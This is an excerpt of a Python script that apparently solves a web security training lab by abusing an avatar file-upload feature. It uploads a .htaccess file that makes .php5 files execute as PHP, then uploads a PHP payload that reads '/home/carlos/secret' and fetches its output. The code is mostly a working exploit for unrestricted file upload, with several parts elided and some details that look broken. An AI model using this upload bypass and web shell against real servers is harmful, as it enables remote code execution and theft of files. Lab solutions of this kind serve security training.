...
class LabSolver:
    ...
    def upload_malicious_htaccess_file(self):
        files = {
            'avatar': (
            '.htaccess', 'AddType application/x-httpd-php .php5', 'application/octet-stream')
        }
        data = {
            'user': 'wiener',
    ...
    def upload_malicious_php_file(self):
        files = {
            'avatar': ('exploit.php5', '<?php echo file_get_contents(\'/home/carlos/secret\'); ?>', 'application/x-httpd-php')
        }
        data = {
            'user': 'wiener',
            'csrf': self.get_csrf_token('my-account')
    ...
    def submit_solution(self):
        answer = self.session.get(self.lab_url + 'files/avatars/exploit.php5')
        data = {
            'answer': answer
        }
    ...
    def solve(self):
        ...
        self.upload_malicious_htaccess_file()
